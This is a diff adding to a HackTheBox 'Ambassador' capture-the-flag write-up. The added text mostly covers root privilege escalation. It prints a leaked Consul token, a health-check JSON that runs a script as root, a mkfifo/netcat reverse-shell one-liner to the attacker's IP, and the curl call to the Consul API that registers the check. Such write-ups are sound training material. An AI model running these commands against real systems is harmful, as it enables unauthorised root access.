@@ -1,6 +1,17 @@
 # Machine: Ambassador (HackTheBox)
 - Difficulty: Medium
 - Link: https://app.hackthebox.com/machines/Ambassador
+- Tools Used:
+  - nmap
+  - sqlite3
+  - mysql
+  - consul
+  - curl
+  - browser + burpsuite
+  - CVE-2021-43798 exploit
+  - linpeas.sh
+  - git
+  - nc (netcat)
 
 ## User Flag
 ### Initial Recon
@@ -111,7 +122,7 @@ Appears there is a known directory path traversal vulnerability. This should be 
 This POC should make things a little easier as we can preload the paths.txt file with the location of all the files we want to search for with sensitive data.
 
 
-5. Exploit was successful and returned the grafana settings and database. Nothing else was of interest.
+5. Exploit was successful and returned the grafana settings and database. Nothing else was of interest. Attempted to look for a way to upload code directly via grafana, with no success. Moved on to looking closer at the file received from the server.
 6. Database is a SQLite3 database so we open it up using sqlite3.  
 ```
 ┌──(kali㉿kali)-[~/hackthebox/ambassador/exploit-grafana-CVE-2021-43798/http_ambassador_htb_3000]
@@ -250,4 +261,91 @@ developer@ambassador:~$ cat user.txt
 User Flag has been found!
 
 ## Root Flag
+1. Uploaded linpeas.sh from my machine to check common areas of privledge escalation. In the Process check I see a service called `consul` running as root. Also noticed there was a `.git` directory in `/opt/my-app/`. 
+2. Moving into the `/opt/my-app/` directory and running `git show` to check the last commits showed:
+```
+developer@ambassador:/opt/my-app$ git show
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:47:36 2022 +0000
 
+    tidy config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+index 35c08f6..fc51ec0 100755
+--- a/whackywidget/put-config-in-consul.sh
++++ b/whackywidget/put-config-in-consul.sh
+@@ -1,4 +1,4 @@
+ # We use Consul for application config in production, this script will help set the correct values for the app
+-# Export MYSQL_PASSWORD before running
++# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+ 
+-consul kv put --token bb03b43b-1d81-XXXX-XXXX-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
++consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+```
+That token will be useful later. 
+3. I have never seen consul before so I dive into the documentation to see what is possible. I try a few commands such as `consul acl token list` but get:
+```
+developer@ambassador:/opt/my-app$ consul acl token list
+Failed to retrieve the token list: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'acl:read')
+```
+I see the mention of a token, so checking the command help I see `-token=00000000-0000-0000-0000-000000000002` can be used with the previously found token to increase permissions. Result of running `consul acl token list` with the token included is now:
+```
+developer@ambassador:/opt/my-app$ consul acl token list --token=bb03b43b-1d81-d62b-24b5-39540ee469b5
+AccessorID:       00000000-0000-0000-0000-000000000002
+SecretID:         anonymous
+Description:      Anonymous Token
+Local:            false
+Create Time:      2022-03-13 23:14:16.941144142 +0000 UTC
+Legacy:           false
+
+AccessorID:       2aae5590-4b99-3b3d-56d9-71b61ee9e744
+SecretID:         bb03b43b-XXXX-XXXX-24b5-39540ee469b5
+Description:      Bootstrap Token (Global Management)
+Local:            false
+Create Time:      2022-03-13 23:14:25.977142971 +0000 UTC
+Legacy:           false
+Policies:
+   00000000-0000-0000-0000-000000000001 - global-management
+```
+Looks like this token provides us with greater permissions.
+4. Checking the consul configuration in `/etc/consul.d/config.d` shows a setting `enable_script_checks` is enabled. The word `script` in this setting piques my interest. Checking google it seems it allows for periodic health checks to be run, which include the ability to execute scripts/applications on the server AS ROOT!
+5. After some googling, I found a valid format for the health check settings and used the following saved as check.json:
+```
+{
+  "ID": "shell",
+  "Name": "rootshell",
+  "DeregisterCriticalServiceAfter": "90m",
+  "Args": ["/dev/shm/rev.sh"],
+  "Shell": "/bin/bash",
+  "Interval": "30s",
+}
+```
+This will execute a bash script in `/dev/shm/rev.sh` every 30 seconds. `rev.sh` included:
+```
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.#.# 6667 >/tmp/f
+```
+I ran `nc -lvnp 6667` on my machine to listen for the connection back. Aternatively because I knew where the flag file would be by default, I could have copied it to a location I could access it at and change permissions, but getting full root shell access is better in my opinion and more realistic.
+
+6. A couple attempts to register it using the `consul` command didn't seem to work. I would register a service via `consul service register` but it didn't seem to run. I decided to try the HTTP API instead. While in the folder with the check.json I created above, I ran:
+```
+developer@ambassador:/dev/shm$ curl --header "X-Consul-Token: bb03b43b-XXXX-XXXX-24b5-39540ee469b5" --request PUT --data @check.json http://127.0.0.1:8500/v1/agent/check/register
+```
+and waited the 30 seconds I set the execution interval. Less than (or exactly) 30 seconds later I was greeted with:
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 6667
+listening on [any] 6667 ...
+connect to [10.10.14.120] from (UNKNOWN) [10.10.11.183] 60118
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls /root/
+cleanup.sh
+root.txt
+snap
+# cat /root/root.txt
+6bfb9fdfXXXXXXXXXXXX59ff43cc720b
+```
+Root and the flag was obtained! 
